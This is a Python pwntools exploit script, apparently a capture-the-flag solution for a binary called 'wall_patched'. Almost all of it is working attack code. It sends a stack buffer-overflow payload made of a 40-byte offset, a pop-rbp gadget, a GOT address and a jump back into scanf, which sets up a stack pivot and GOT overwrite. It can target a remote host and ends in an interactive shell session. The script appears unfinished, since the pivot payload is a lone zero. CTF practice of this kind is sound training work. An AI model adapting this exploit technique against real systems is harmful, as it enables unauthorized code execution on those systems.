#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('wall_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+139
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    offset = 40
    pop_rbp = 0x40115d # pop rbp; ret;
    got_table = exe.got["setbuf"] + 0x80
    ret = 0x40101a # ret;

    payload = flat({
        offset: [
            pop_rbp,
            got_table,
            exe.sym["__isoc99_scanf"] + 12
        ]
    })

    size = 128
    payload = payload.ljust(size, b".")

    pivot = flat(
        [
            0
            
        ]
    )

    io.sendlineafter(b"Message:", pivot)
    io.sendlineafter(b"?", payload)

    # io.sendlineafter(b":", b"\x00")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

